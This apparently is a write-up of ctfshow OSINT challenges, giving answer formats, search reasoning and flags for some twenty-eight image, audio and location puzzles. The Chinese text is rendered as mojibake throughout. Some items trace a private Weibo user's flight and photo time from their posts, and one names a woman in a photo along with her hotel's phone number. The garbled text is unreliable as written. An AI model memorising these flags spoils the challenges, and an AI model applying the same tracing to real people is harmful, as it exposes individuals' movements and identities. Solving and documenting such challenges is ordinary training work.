<h1 id="è‡´æˆ‘è¶…å§"><a href="#è‡´æˆ‘è¶…å§" class="headerlink" title="è‡´æˆ‘è¶…å§"></a>è‡´æˆ‘è¶…å§</h1><p>æ ¼å¼ï¼šctfshow{ä¸»è§’ID_vs_å¯¹æ‰‹id}ï¼ˆå…¨å°å†™ï¼‰<br>ç™¾åº¦è¯†å›¾å¯ä»¥æ‰¾åˆ°ä¸€ç¯‡çŸ¥ä¹æ–‡ç« ï¼Œæåˆ°äº†è¿™æ˜¯é€‰æ‰‹<code>innovation</code>çš„æ“ä½œ<br>å¦ä¸€ç¯‡æ–‡ç« æåˆ°å¯¹æ‰‹<code>dark</code><br><img src="/img/ctfshow/wlmz/%E8%87%B4%E6%88%91%E8%B6%85%E5%90%A7.png"><br>ctfshow{innovation_vs_dark}</p>
<h1 id="å±±å¤–æœ‰å±±"><a href="#å±±å¤–æœ‰å±±" class="headerlink" title="å±±å¤–æœ‰å±±"></a>å±±å¤–æœ‰å±±</h1><p>æ ¼å¼ï¼šctfshow{å±±çš„åå­—}<br>è¯´å®è¯è¿™ä¸ªå›¾æˆ‘ä¸€çœ¼å°±çœ‹å‡ºæ¥äº†æ˜¯ç ç©†æœ—ç›å³°<br>ä½†è¿˜æ˜¯è¯†å›¾ç¡®è®¤äº†ä¸€ä¸‹<br><img src="/img/ctfshow/wlmz/%E7%8F%A0%E7%A9%86%E6%9C%97%E7%8E%9B%E5%B3%B0.png"><br>ctfshow{ç ç©†æœ—ç›å³°}</p>
<h1 id="å¯†é›†ææƒ§"><a href="#å¯†é›†ææƒ§" class="headerlink" title="å¯†é›†ææƒ§"></a>å¯†é›†ææƒ§</h1><p>æ ¼å¼ï¼šæäº¤å›¾ç‰‡æ‰€åœ¨åœ°çš„ç»çº¬åæ ‡ï¼Œå°±ç½‘ä¸Šå…¬å¼€çš„å°±æˆ<br>æ ¹æ®ç§¯ç´¯ä¸ç‰¹å¾ç›´æ¥çœ‹å‡ºæ˜¯ç¾å›½é£æœºåŸåœº<br>å½“ç„¶ç™¾åº¦è¯†å›¾ä¹Ÿèƒ½å‡º<br><img src="/img/ctfshow/wlmz/%E5%AF%86%E9%9B%86%E6%81%90%E6%83%A7-1.png"><br>ctfshow{32Â°09â€™19.17N,110Â°49â€™46.69W}</p>
<h1 id="å“å•·å“å•·"><a href="#å“å•·å“å•·" class="headerlink" title="å“å•·å“å•·"></a>å“å•·å“å•·</h1><p>æ ¼å¼ï¼šctfshow{ç«è½¦ç«™åç§°}<br>è°·æ­Œè¯†å›¾å¯ä»¥ç›´æ¥æ‰¾åˆ°<br><img src="/img/ctfshow/wlmz/%E5%93%90%E5%95%B7%E5%93%90%E5%95%B71.png"><br>ctfshow{å’Œç”°}</p>
<h1 id="é²¶é±¼ä¹‹è°œ"><a href="#é²¶é±¼ä¹‹è°œ" class="headerlink" title="é²¶é±¼ä¹‹è°œ"></a>é²¶é±¼ä¹‹è°œ</h1><p>æ ¼å¼ï¼šctfshow{èˆªç­å·_æ‹æ‘„æ—¶åˆ†}ï¼Œå¦‚ctfshow{ab1234_1537}ï¼ˆ15æ—¶37åˆ†æ‹æ‘„ï¼‰<br>è¿™é¢˜å¤§æ¦‚æ˜¯ç½‘ç»œè¿·è¸ªä¸­æœ€éš¾çš„ä¸€é¢˜ï¼Œç›´æ¥æ”¾å®˜ç½‘wpäº†ï¼š</p>
<p>part1_èˆªç­å·ï¼š<br>æ ¹æ®ç…§ç‰‡æ°´å°å¯ä»¥æ‰¾åˆ°å¾®åšä¸»äººï¼Œç»¼åˆ8æœˆ29å·ä»¥åŠä¹‹å‰å‘çš„å¾®åšå¯ä»¥çœ‹å‡ºä»–ä¸€ç›´å±…ä½åœ¨ä¸Šæµ·ï¼Œå¾€ä¸‹ç¿»å°±èƒ½æ‰¾åˆ°è¿™å¼ ç…§ç‰‡å‡ºå¤„ï¼Œæ ¹æ®è¯„è®ºå¯ä»¥çŒœæµ‹å‡ºå¯èƒ½æ˜¯å›å¤©æ´¥çš„èˆªç­ï¼Œæ ¹æ®é‚£æ¡å¾®åšçš„å…¶ä»–ç…§ç‰‡å’Œå‘å¸ƒæ—¶é—´å¯ä»¥æ¨æµ‹å‡ºèˆªç­çš„èµ·é£æ—¶é—´ä¸º18ç‚¹å·¦å³ï¼Œå†é€šè¿‡é£å¸¸å‡†appå¯ä»¥æŸ¥åˆ°2021.8.5çš„èˆªç­ä¿¡æ¯ï¼Œç„¶åæ ¹æ®é£æœºçš„åº§æ¤…æ¨ç®—å‡ºä¹˜åçš„èˆªç­å·ä¸ºca1524<br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-1.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-2.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-3.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-4.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-5.jpg"></p>
<p>part2_æ‹æ‘„æ—¶é—´ï¼š<br>é€šè¿‡é£å¸¸å‡†appå¯ä»¥æ‰¾åˆ°èˆªç­å®é™…èµ·é£æ—¶é—´ä¸º18:27ä»¥åŠå¹³å‡é£è¡Œé€Ÿåº¦ä¸º11.68km&#x2F;minï¼Œè€Œå½“å¤©ï¼ˆ2021.8.5ï¼‰å±±ä¸œçš„æ—¥è½æ—¶é—´ä¸º19:14:39ï¼Œå†ç»“åˆä¸Šæµ·åˆ°æµå—çš„ç›´çº¿è·ç¦»816kmå·¦å³å¯ä»¥å¾—å‡ºï¼Œé£æœºåˆ°æµå—éœ€è¦70minï¼Œæ­¤æ—¶å·²ç»æ—¥è½äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤æ—¶çš„é£æœºè¿˜æ²¡é£è¿‡æµå—ï¼Œä¸”ä½ç½®åœ¨ä¸Šæµ·å’Œæµå—ä¹‹é—´ã€‚<br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-6.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-7.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-8.jpg"></p>
<p>ä»æ—¥è½æ—¶é—´19:14å¼€å§‹åæ¨ï¼Œæ ¹æ®é£æœºå¹³å‡é€Ÿåº¦ï¼Œåœ¨æ—¥è½å‰å¤§çº¦èƒ½é£549kmï¼Œä»¥è™¹æ¡¥æœºåœºä¸ºåœ†å¿ƒç”»ä¸€ä¸ªåŠå¾„549kmçš„åœ†ï¼Œå†ç»“åˆèˆªçº¿åˆ¤æ–­å¤§æ¦‚ç‡åœ¨æ±Ÿè‹ä¸Šç©ºï¼Œå†ç”¨è°·æ­Œåœ°çƒæŸ¥çœ‹å…·ä½“æ—¶åˆ»çš„å«æ˜Ÿå›¾ï¼Œå¯ä»¥æ¨ç®—å‡ºæ˜¯åœ¨é£æœºèµ·é£åååˆ†é’Ÿä¹‹å†…æ‹æ‘„çš„ã€‚<br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-9.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-10.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-11.jpg"><br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-12.jpg"></p>
<p>ä»å›¾ç‰‡å¯ä»¥çœ‹å‡ºé£æœºç¨å¾®æœ‰äº›å€¾æ–œï¼Œè¯´æ˜é£æœºå¤„äºçˆ¬å‡é˜¶æ®µï¼Œå†æ ¹æ®çª—å¤–çš„äº‘å±‚å¯ä»¥åˆ¤æ–­å‡ºæ­¤æ—¶é£æœºé«˜åº¦å¤§çº¦ä¸º6000ç±³ï¼Œå†ç”¨é£å¸¸å‡†appæŸ¥çœ‹èˆªçº¿å›é¡¾ï¼Œé£è¡Œé«˜åº¦ä¸º6000ç±³æ—¶é£æœºä½äºå—é€šå¸‚é™„è¿‘ï¼Œä¸”å¤„äºçˆ¬å‡çŠ¶æ€ï¼Œä¸ä¹‹å‰çš„æ¨æ–­ç›¸å»åˆï¼Œå†çœ‹å…·ä½“æ—¶åˆ»ï¼Œå¤§è‡´ä¸º18:37ï¼Œå¾—åˆ°flag<br><img src="/img/ctfshow/wlmz/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-13.jpg"></p>
<p>ctfshow{ca1524_1837}</p>
<h1 id="è¿™é‡Œæœ‰è½¨"><a href="#è¿™é‡Œæœ‰è½¨" class="headerlink" title="è¿™é‡Œæœ‰è½¨"></a>è¿™é‡Œæœ‰è½¨</h1><p>æ ¼å¼ï¼šæäº¤è½¦ç«™åç§°å’Œè½¦æ¬¡å·ï¼Œä¾‹å¦‚ï¼šctfshow{ä¸Šæµ·T1234}<br>ç™¾åº¦æœåˆ—è½¦å‹å·ç›¸å…³æ–‡ç« ï¼Œå¯¹æ¯”å›¾ç‰‡å¾—åˆ°è½¦å‹å·ä¸º<code>CR400BF</code><br><img src="/img/ctfshow/wlmz/%E8%BF%99%E9%87%8C%E6%9C%89%E8%BD%A8-1.jpg"></p>
<p>è¯†å›¾æ‰¾åˆ°ç«™ç‚¹åƒå²›æ¹–</p>
<p>æ ¹æ®å…‰çº¿ç­‰ï¼Œä¸å¯èƒ½æ˜¯æ—©ä¸Šå’Œæ™šä¸Šï¼Œå‰©ä¸‹çš„çˆ†ç ´ä¸€ä¸‹<br><img src="/img/ctfshow/wlmz/%E8%BF%99%E9%87%8C%E6%9C%89%E8%BD%A8-2.jpg"><br>å¾—åˆ°ï¼š<br>ctfshow{åƒå²›æ¹–G7498}</p>
<h1 id="çˆ†ç ´ä¸äº†"><a href="#çˆ†ç ´ä¸äº†" class="headerlink" title="çˆ†ç ´ä¸äº†"></a>çˆ†ç ´ä¸äº†</h1><p>æ ¼å¼ï¼šctfshow{æ‹æ‘„è€…æ‰€å¤„å»ºç­‘çš„è”ç³»æ‰‹æœºå·}<br>ç™¾åº¦è¯†å›¾å¾—åˆ°<code>æ³‰å·ä¸œè¥¿å¡”</code><br><img src="/img/ctfshow/wlmz/%E7%88%86%E7%A0%B4%E4%B8%8D%E4%BA%861.png"><br>ä»ç…§ç‰‡ä¸Šçœ‹ï¼Œæ‹æ‘„è€…è·ç¦»æ™¯ç‚¹å¾ˆè¿‘<br>è¿˜æœ‰å›¾ç‰‡ä¸­æˆ¿å­çš„èµ°å‘<br>å¯ä»¥æ’é™¤é•‡å›½å¡”<br>ä»å¯¿å¡”é™„è¿‘èƒ½æ‹æ‘„çš„åœ°æ–¹ä¸å¤šï¼ŒåŸºæœ¬å°±é”å®šäº†æ³‰å·ç­‰é£æ°‘ä¿—<br><img src="/img/ctfshow/wlmz/%E7%88%86%E7%A0%B4%E4%B8%8D%E4%BA%862.png"><br>ctfshow{18050999086}</p>
<h1 id="ç›®ä¹‹æ‰€åŠ"><a href="#ç›®ä¹‹æ‰€åŠ" class="headerlink" title="ç›®ä¹‹æ‰€åŠ"></a>ç›®ä¹‹æ‰€åŠ</h1><p>æ ¼å¼ï¼šctfshow{åŒºå·-ç”µè¯}<br>åŸå›¾çš„ç»çº¬åº¦æ²¡æœ‰å»æ‰<br>è®¡ç®—æ–¹å¼<br><img src="/img/ctfshow/wlmz/%E7%BB%8F%E7%BA%AC%E5%BA%A6%E8%AE%A1%E7%AE%97.png"><br>å¾—åˆ°å¤§æ¦‚ä½ç½®ä¸ºè†ç”°å¸‚<br><img src="/img/ctfshow/wlmz/%E8%8E%86%E7%94%B0.png"><br>é€šè¿‡ç™¾åº¦å®æ™¯åœ°å›¾æ‰¾åˆ°é™„è¿‘çš„æ ‡å¿—æ€§å»ºç­‘ï¼ˆè™½ç„¶æˆ‘æ„Ÿè§‰ä¸å¤ªåƒï¼Œè¿™ä¸ªè§’æ˜¯å¹³çš„ï¼Œå›¾é‡Œæ˜¯å°–çš„ï¼‰<br><img src="/img/ctfshow/wlmz/%E7%9B%AE%E4%B9%8B%E6%89%80%E5%8F%8A.png"><br>æŸ¥çœ‹é™„è¿‘çš„æ™¯ç‚¹<br>æ ¹æ®çœ‹æ ‡å¿—æ€§å»ºç­‘çš„è§’åº¦ï¼ŒåŠ ä¸Šå®šä½åœ°ç‚¹ï¼Œåº”è¯¥æ˜¯å‡¤å‡°å±±å…¬å›­<br>æŸ¥çœ‹ç”µè¯å·ç <br><img src="/img/ctfshow/wlmz/%E5%87%A4%E5%87%B0%E5%B1%B1%E5%85%AC%E5%9B%AD.png"><br>ctfshow{0594-2680716}</p>
<h1 id="çª—å¤–é£æ™¯"><a href="#çª—å¤–é£æ™¯" class="headerlink" title="çª—å¤–é£æ™¯"></a>çª—å¤–é£æ™¯</h1><p>æ ¼å¼ï¼šctfshow{ç›®çš„åŸå¸‚+æ¯”èµ›åœ°ç‚¹+ä¸‹ä¸€åœºæ¯”èµ›åŸå¸‚}</p>
<h1 id="æ¥ç‚¹ç¦åˆ©"><a href="#æ¥ç‚¹ç¦åˆ©" class="headerlink" title="æ¥ç‚¹ç¦åˆ©"></a>æ¥ç‚¹ç¦åˆ©</h1><p>æ ¼å¼ï¼šctfshow{ç…§ç‰‡ä¸­å¥³å­©åå­—_å½“æ—¶ä½çš„é…’åº—ç”µè¯å·ç }<br>ç™¾åº¦è¯†å›¾å¾—åˆ°æ¯”èµ›å’Œäººç‰©åå­—<br><img src="/img/ctfshow/wlmz/%E6%9D%A5%E7%82%B9%E7%A6%8F%E5%88%A9-1.png"></p>
<p>ç™¾åº¦æœæ¯”èµ›åœ°ç‚¹<br><img src="/img/ctfshow/wlmz/%E6%9D%A5%E7%82%B9%E7%A6%8F%E5%88%A9-2.png"></p>
<p>æ ¹æ®å³ä¸Šè§’æ‹›ç‰Œæœåˆ°ç”µè¯<br><img src="/img/ctfshow/wlmz/%E6%9D%A5%E7%82%B9%E7%A6%8F%E5%88%A9-3.png"></p>
<p>ctfshow{éƒ­æ•å–„_1833-8855}</p>
<h1 id="ä½ çš„åå­—"><a href="#ä½ çš„åå­—" class="headerlink" title="ä½ çš„åå­—"></a>ä½ çš„åå­—</h1><p>å¤§ä½¬ä»¬éƒ½è¯´èƒ½ç›´æ¥æœåˆ°<br>ä½†æˆ‘æœäº†å‡ åœˆéƒ½æ²¡æ‰¾åˆ°ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å§¿åŠ¿ä¸å¯¹<br>è¿™é‡Œç›´æ¥å€Ÿç”¨äº†å¤§ä½¬çš„å›¾ç‰‡<br><img src="/img/ctfshow/wlmz/%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97111.png"><br>ctfshow{é‡èœå±±ä¸‹å•†åº—}</p>
<h1 id="ä¸¥æŸ¥å¤–æŒ‚"><a href="#ä¸¥æŸ¥å¤–æŒ‚" class="headerlink" title="ä¸¥æŸ¥å¤–æŒ‚"></a>ä¸¥æŸ¥å¤–æŒ‚</h1><p>æ ¼å¼ï¼šâ€™ctfshow{â€˜ + flag +â€™|â€™ + link + â€˜}â€™<br>hint1: flagåœ¨ä¸¾æŠ¥å¸–å­çš„å›¾ç‰‡ä¸Š<br>hint2: é“¾æ¥åœ°å€ä¸æ˜¯ç¼“å­˜çš„ç½‘é¡µï¼Œæ˜¯ç›´æ¥è®¿é—®çš„é“¾æ¥ï¼ˆ404ï¼‰ï¼Œæœ«å°¾ä¸å¸¦â€™&#x2F;â€˜<br>ç™¾åº¦å…³é”®è¯å¯ä»¥ç›´æ¥æœåˆ°é‚£ä¸ª404çš„é¡µé¢<code>https://www.taptap.com/topic/6820231</code><br><img src="/img/ctfshow/wlmz/%E4%B8%A5%E6%9F%A5%E5%A4%96%E6%8C%821.png"><br>ä½¿ç”¨è°·æ­Œå¿«ç…§æŸ¥çœ‹æ–‡ç« ä¸­çš„å›¾ç‰‡<br><img src="/img/ctfshow/wlmz/%E4%B8%A5%E6%9F%A5%E5%A4%96%E6%8C%822.png"><br>å¾—åˆ°flag<br><img src="/img/ctfshow/wlmz/%E4%B8%A5%E6%9F%A5%E5%A4%96%E6%8C%823.png"><br>å°†ç½‘å€å’Œflagè¿æ¥èµ·æ¥<br>ctfshow{flag{M1ssInG_T5p1N_P0Wer}|<a href="https://www.taptap.com/topic/6820231%7D">https://www.taptap.com/topic/6820231}</a></p>
<h1 id="é™„å¸¦å¯¼èˆª"><a href="#é™„å¸¦å¯¼èˆª" class="headerlink" title="é™„å¸¦å¯¼èˆª"></a>é™„å¸¦å¯¼èˆª</h1><p>ã€‚ã€‚ã€‚<br>åœ¨ç¾¤æ–‡ä»¶ä¸­ã€‚ï¼ˆç¾¤å·ï¼š372619038ï¼‰<br><img src="/img/ctfshow/wlmz/%E9%99%84%E5%B8%A6%E5%AF%BC%E8%88%AA1.png"><br>ctfshow{å‹‡æ•¢ç‚«ç‚«ï¼Œä¸æ€•å›°éš¾}</p>
<h1 id="ç»™ä½ æ‹·ä¸Š"><a href="#ç»™ä½ æ‹·ä¸Š" class="headerlink" title="ç»™ä½ æ‹·ä¸Š"></a>ç»™ä½ æ‹·ä¸Š</h1><p>æ ¼å¼ï¼šctfshow{åä½çº¯æ•°å­—}<br>ç™¾åº¦è¯†å›¾æ‰¾åˆ°äººç‰©åç§°<br><img src="/img/ctfshow/wlmz/%E7%BB%99%E4%BD%A0%E6%8B%B7%E4%B8%8A1.png"><br>å¾®åšæœç´¢<br><img src="/img/ctfshow/wlmz/%E7%BB%99%E4%BD%A0%E6%8B%B7%E4%B8%8A2.png"><br>ctfshow{1928665723}</p>
<h1 id="èœçåŒçœ¼"><a href="#èœçåŒçœ¼" class="headerlink" title="èœçåŒçœ¼"></a>èœçåŒçœ¼</h1><p>æ ¼å¼ï¼šctfshow{æ¯”èµ›å¼€å§‹æ—¥æœŸ_æ¯”èµ›å_å‡ºé¢˜è€…ä¸­æ–‡id_åŸå›¾ç‰‡æ–‡ä»¶å_flag{xxxxxx}}<br>è¿™ä¸ªå¥½éš¾æœ<br>ç¿»åˆ°ç¬¬ä¹é¡µæ‰çœ‹åˆ°<br>å¾—åˆ°æ¯”èµ›å<code>çº¢å¸½æ¯</code><br><img src="/img/ctfshow/wlmz/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC1.png"><br>æœç´¢å…¶ä»–wpæ–‡ç« <br>å¾—åˆ°flag<code>flag&#123;d7f1417bfafbf62587e0&#125;</code>å’ŒåŸå›¾ç‰‡æ–‡ä»¶å<code>vegetable.png</code><br>åœ¨å®˜ç½‘æ‰¾åˆ°æ—¶é—´<code>2019-11-10</code><br><img src="/img/ctfshow/wlmz/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC2.png"><br>wpä¸­å‡ºç°äº†å‡ºé¢˜äººçš„idï¼šb1cx<br><img src="/img/ctfshow/wlmz/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC3.png"><br>ç™¾åº¦æœç´¢b1cx,ç¬¬ä¸€ä¸ªgithubé¡µé¢æ‰¾åˆ°ä¸­æ–‡id<code>è èå¹é›ª</code><br><img src="/img/ctfshow/wlmz/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC4.png"><br>ç»„åˆåœ¨ä¸€èµ·<br>ctfshow{2019-11-10_çº¢å¸½æ¯_è èå¹é›ª_vegetable.png_flag{d7f1417bfafbf62587e0}}</p>
<h1 id="ç«¥å¹´å›å¿†"><a href="#ç«¥å¹´å›å¿†" class="headerlink" title="ç«¥å¹´å›å¿†"></a>ç«¥å¹´å›å¿†</h1><p>æ ¼å¼ï¼šctfshow{åŠ¨ç”»ç‰‡çš„åç§°}<br>çœ‹å³ä¸Šè§’ä¸ºbilibiliç‹¬æ’­<br><img src="/img/ctfshow/wlmz/%E7%AB%A5%E5%B9%B4%E5%9B%9E%E5%BF%861.png"><br>çœ‹ç”»é£æ˜¯å›½äº§çš„<br>åœ¨å›½äº§åŠ¨ç”»ä¸­æœç´¢ç‹¬å®¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªé€ å‹ä¸€è‡´çš„å°é¢<br><img src="/img/ctfshow/wlmz/%E7%AB%A5%E5%B9%B4%E5%9B%9E%E5%BF%862.png"><br>ctfshow{ç¾å½±å¤§ä¹å›­}</p>
<h1 id="æˆ‘åœ¨å“ªå‘¢"><a href="#æˆ‘åœ¨å“ªå‘¢" class="headerlink" title="æˆ‘åœ¨å“ªå‘¢"></a>æˆ‘åœ¨å“ªå‘¢</h1><p>ã€‚ã€‚å›¾ç‰‡æ”¾å¤§ï¼Œçœ‹åˆ°å¹¿å·ï¼Œå¸¸å¹³ï¼Œæ¨Ÿæœ¨å¤´</p>
<p>ctfshow{ä¸œèç«™}</p>
<h1 id="è€³ç†Ÿèƒ½è¯¦"><a href="#è€³ç†Ÿèƒ½è¯¦" class="headerlink" title="è€³ç†Ÿèƒ½è¯¦"></a>è€³ç†Ÿèƒ½è¯¦</h1><p>æ ¼å¼ï¼šctfshow{éŸ³é¢‘å‡ºå¤„}<br>çœ‹æ ·å­æ˜¯åè½¬è¿‡çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨è½¯ä»¶åè½¬å›æ¥<br><img src="/img/ctfshow/wlmz/%E8%80%B3%E7%86%9F%E8%83%BD%E8%AF%A61.png"><br>qqè¯†æ›²<br><img src="/img/ctfshow/wlmz/%E8%80%B3%E7%86%9F%E8%83%BD%E8%AF%A62.png"><br>ctfshow{ç«ç‘°èŠ±çš„è‘¬ç¤¼}</p>
<h1 id="ä¼ ç»Ÿå°åƒ"><a href="#ä¼ ç»Ÿå°åƒ" class="headerlink" title="ä¼ ç»Ÿå°åƒ"></a>ä¼ ç»Ÿå°åƒ</h1><p>æ ¼å¼ï¼šctfshow{åŒºå·-è”ç³»ç”µè¯}<br>è€è§„çŸ©å…ˆç™¾åº¦è¯†å›¾<br>æ‰¾åˆ°ä¸€å¼ ä¸€æ¨¡ä¸€æ ·çš„<br><img src="/img/ctfshow/wlmz/%E4%BC%A0%E7%BB%9F%E5%B0%8F%E5%90%831.png"><br>å›¾ç‰‡å‡ºè‡ªä¸€ç¯‡æ¸¸è®°<br>æ‰¾åˆ°äº†åœ°å€å’Œåº—å<br><img src="/img/ctfshow/wlmz/%E4%BC%A0%E7%BB%9F%E5%B0%8F%E5%90%832.png"><br>ç™¾åº¦åœ°å›¾<br><img src="/img/ctfshow/wlmz/%E4%BC%A0%E7%BB%9F%E5%B0%8F%E5%90%833.png"><br>ctfshow{0595-22373358}</p>
<h1 id="å®‡å®™å¤§æˆ˜"><a href="#å®‡å®™å¤§æˆ˜" class="headerlink" title="å®‡å®™å¤§æˆ˜"></a>å®‡å®™å¤§æˆ˜</h1><p>æ ¼å¼ï¼šctfshow{æ˜Ÿç³»|æˆ˜æ–—å¼€å§‹æ—¶é—´}<br>ç™¾åº¦è¯†å›¾<br>æœ‰å¾ˆå¤šä¸€æ¨¡ä¸€æ ·çš„å›¾ç‰‡ï¼Œéšä¾¿ç‚¹ä¸€å¼ <br><img src="/img/ctfshow/wlmz/%E5%AE%87%E5%AE%99%E5%A4%A7%E6%88%981.png"><br>æ‰¾åˆ°æ—¥æœŸå’Œåœ°ç‚¹<br><img src="/img/ctfshow/wlmz/%E5%AE%87%E5%AE%99%E5%A4%A7%E6%88%982.png"><br>ctfshow{2014-03-25|49-U6U}</p>
<h1 id="é£Ÿå ‚è½¶é—»"><a href="#é£Ÿå ‚è½¶é—»" class="headerlink" title="é£Ÿå ‚è½¶é—»"></a>é£Ÿå ‚è½¶é—»</h1><p>æ ¼å¼ï¼šctfshow{å­¦æ ¡åç§°_é”¦æ——è½æ¬¾æ—¥æœŸ}<br>ç™¾åº¦å…³é”®è¯æœç´¢<br><img src="/img/ctfshow/wlmz/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB1.png"><br>å¾—åˆ°å­¦æ ¡åå­—<br><img src="/img/ctfshow/wlmz/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB2.png"><br>å†æ¬¡æœç´¢<br><img src="/img/ctfshow/wlmz/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB3.png"><br>åœ¨è´´å§ä¸­å¾—åˆ°å›¾ç‰‡ï¼Œæ‹¿åˆ°æ—¥æœŸ<br><img src="/img/ctfshow/wlmz/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB4.png"><br>ctfshow{å—æ–¹ç§‘æŠ€å¤§å­¦_2018_09}</p>
<h1 id="ä¸‰ç§¦å¥—é¤"><a href="#ä¸‰ç§¦å¥—é¤" class="headerlink" title="ä¸‰ç§¦å¥—é¤"></a>ä¸‰ç§¦å¥—é¤</h1><p>æ ¼å¼ï¼šctfshow{æ‰€åœ¨åœ°å¹¿åœºåç§°},å¦‚ctfshow{å¤©å®‰é—¨å¹¿åœº}<br>æ ¹æ®é¢˜ç›®ä¸‰ç§¦å’Œç…§ç‰‡ä¸­çš„è€æ½¼å…³é”å®šé™•è¥¿</p>
<p>æ ¹æ®æ‹›ç‰Œç™¾åº¦å¾—åˆ°å¹¿åœºåå­—<br><img src="/img/ctfshow/wlmz/%E4%B8%89%E7%A7%A6%E5%A5%97%E9%A4%90.png"></p>
<p>ctfshow{é‡‘è¾‰ç¯çƒå¹¿åœº}</p>
<h1 id="å¤åŸè±ªåº­"><a href="#å¤åŸè±ªåº­" class="headerlink" title="å¤åŸè±ªåº­"></a>å¤åŸè±ªåº­</h1><p>æ ¼å¼ï¼šctfshow{éš”å£é…’åº—ç”µè¯}ï¼Œctfshow{åŒºå·-ç”µè¯}</p>
<p>ç¼©å°ä¸€ç‚¹ç™¾åº¦è¯†å›¾<br><img src="/img/ctfshow/wlmz/%E5%8F%A4%E5%9F%8E%E8%B1%AA%E5%BA%AD-1.png"></p>
<p>ç™¾åº¦æœè¥¿å®‰æ°‘ä¹å›­æ–‡åŒ–è¡—é™„è¿‘çš„é…’åº—<br>å¾—åˆ°è¥¿å®‰å¯ŒåŠ›å¸Œå°”é¡¿é…’åº—<br><img src="/img/ctfshow/wlmz/%E5%8F%A4%E5%9F%8E%E8%B1%AA%E5%BA%AD-2.png"></p>
<p>ctfshow{029-87388888}</p>
<h1 id="ç¾¤æ¬ºå‡ºç‹±"><a href="#ç¾¤æ¬ºå‡ºç‹±" class="headerlink" title="ç¾¤æ¬ºå‡ºç‹±"></a>ç¾¤æ¬ºå‡ºç‹±</h1><p>æ ¼å¼ï¼šå›¾åé¢çš„å±±çš„åå­—å’Œæµ·æ‹” ä¾‹å¦‚ctfshow{ç ç©†æœ—ç›å³°_635}</p>
<p>ç›´æ¥ç™¾åº¦åœ°å›¾å¯ä»¥ç›´æ¥æ‰¾åˆ°ä½ç½®<br><img src="/img/ctfshow/wlmz/%E7%BE%A4%E6%AC%BA%E5%87%BA%E7%8B%B1-1.png"></p>
<p>é™„è¿‘çš„å‡ åº§å±±ç™¾åº¦ä¸€ä¸‹æµ·æ‹”</p>
<p>ctfshow{ä¹åå±±_741}</p>
<h1 id="Las-Vegaså†é™©è®°-1"><a href="#Las-Vegaså†é™©è®°-1" class="headerlink" title="Las Vegaså†é™©è®°-1"></a>Las Vegaså†é™©è®°-1</h1><p>è°·æ­Œå¯ä»¥æœåˆ°åŸé¢˜</p>
<p><img src="/img/ctfshow/wlmz/juanwang-osint-lswjs-1.png"></p>
<p>ctfshow{36.171,-115.139}</p>
<h1 id="Las-Vegaså†é™©è®°-2"><a href="#Las-Vegaså†é™©è®°-2" class="headerlink" title="Las Vegaså†é™©è®°-2"></a>Las Vegaså†é™©è®°-2</h1><p>ä¸€ç‚¹ä¸€ç‚¹çœ‹è§†é¢‘æ¯”å¯¹å°±å¯ä»¥æ‰¾åˆ°é»„è½¦äº†</p>
<p><img src="/img/ctfshow/wlmz/juanwang-osint-lswjs-2.png"></p>
<p>ctfshow{TUX&amp;GOWN_36.1575,-115.1483}</p>
<h1 id="Las-Vegaså†é™©è®°-3"><a href="#Las-Vegaså†é™©è®°-3" class="headerlink" title="Las Vegaså†é™©è®°-3"></a>Las Vegaså†é™©è®°-3</h1><p>å…ˆæ‰¾åˆ°è½¦ï¼Œç„¶åè§‚å¯Ÿå‘¨å›´ç¯å¢ƒï¼Œæ‰¾åˆ°å…³é”®å»ºç­‘ï¼ˆluxoré‡‘å­—å¡”ï¼Œmgmé…’åº—ï¼‰<br>è°·æ­Œåœ°å›¾å¾ˆå®¹æ˜“æ‰¾åˆ°è·¯å£ï¼Œä½†æ˜¯è¿˜è¦æ³¨æ„æ—¶é—´èŠ‚ç‚¹æ˜¯2017å¹´</p>
<p><img src="/img/ctfshow/wlmz/juanwang-osint-lswjs-3-1.png"></p>
<p>ctfshow{Mandalay_Bay_Rd}</p>
<h1 id="çº¢è¥¿ç§€æ—"><a href="#çº¢è¥¿ç§€æ—" class="headerlink" title="çº¢è¥¿ç§€æ—"></a>çº¢è¥¿ç§€æ—</h1><p>ç™¾åº¦äº†åŠå¤©ï¼Œæœ€åå‘ç°åŸå‰§ä¸­å°±æœ‰</p>
<p><img src="/img/ctfshow/wlmz/juanwang-osint-hxxl.png"></p>
<p>ctfshow{å¼ºä»”å’¸é±¼_13912345670_8233333}</p>
